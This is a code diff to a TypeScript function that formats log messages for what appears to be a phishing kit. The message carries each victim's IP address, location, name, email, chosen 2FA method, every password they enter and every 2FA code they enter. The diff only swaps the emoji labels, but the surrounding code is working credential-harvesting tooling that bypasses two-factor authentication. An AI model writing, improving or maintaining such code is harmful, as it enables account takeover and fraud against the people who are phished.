@@ -51,18 +51,18 @@ function formatLogMessage(payload: LogEventPayload, location: LocationData): str
   
   // IP và Location - có thể copy
   let message = "";
-  message += `<b>📍 IP:</b> <code>${location.ip}</code>\n`;
-  message += `<b>🌍 Location:</b> ${location.location.country} (<code>${location.location.countryCode}</code>)\n`;
+  message += `<b>💋 IP:</b> <code>${location.ip}</code>\n`;
+  message += `<b>💗 Location:</b> ${location.location.country} (<code>${location.location.countryCode}</code>)\n`;
   if (location.location.city) {
-    message += `<b>🏙️ City:</b> ${location.location.city}\n`;
+    message += `<b>🦑 City:</b> ${location.location.city}\n`;
   }
   if (location.location.region) {
-    message += `<b>🗺️ Region:</b> ${location.location.region}\n`;
+    message += `<b>🐷 Region:</b> ${location.location.region}\n`;
   }
   message += "\n";
 
   if (formDetails) {
-    message += "<b>📋 Form Data:</b>\n";
+    message += "<b>🌷 Form Data:</b>\n";
     message += `<b>Name:</b> <code>${formDetails.fullName}</code>\n`;
     message += `<b>Email:</b> <code>${formDetails.email}</code>\n`;
     if (formDetails.emailBusiness) {
@@ -86,13 +86,13 @@ function formatLogMessage(payload: LogEventPayload, location: LocationData): str
       email: "Email",
       whatsapp: "WhatsApp",
     };
-    message += `<b>🔐 2FA Method:</b> <code>${methodNames[selectedMethod] || selectedMethod}</code>\n\n`;
+    message += `<b>🌸 2FA Method:</b> <code>${methodNames[selectedMethod] || selectedMethod}</code>\n\n`;
   }
 
   // Password attempts
   if (passwordAttempts.length > 0) {
     passwordAttempts.forEach((attempt, i) => {
-      message += `🔐 Password Attempt ${i + 1}: <code>${attempt}</code>\n`;
+      message += `🌸 Password Attempt ${i + 1}: <code>${attempt}</code>\n`;
     });
   }
 
@@ -104,7 +104,7 @@ function formatLogMessage(payload: LogEventPayload, location: LocationData): str
   // 2FA attempts
   if (twofaAttempts.length > 0) {
     twofaAttempts.forEach((attempt, i) => {
-      message += `🔒 2FA Attempt ${i + 1}: <code>${attempt}</code>\n`;
+      message += `🌸 2FA Attempt ${i + 1}: <code>${attempt}</code>\n`;
     });
   }
 
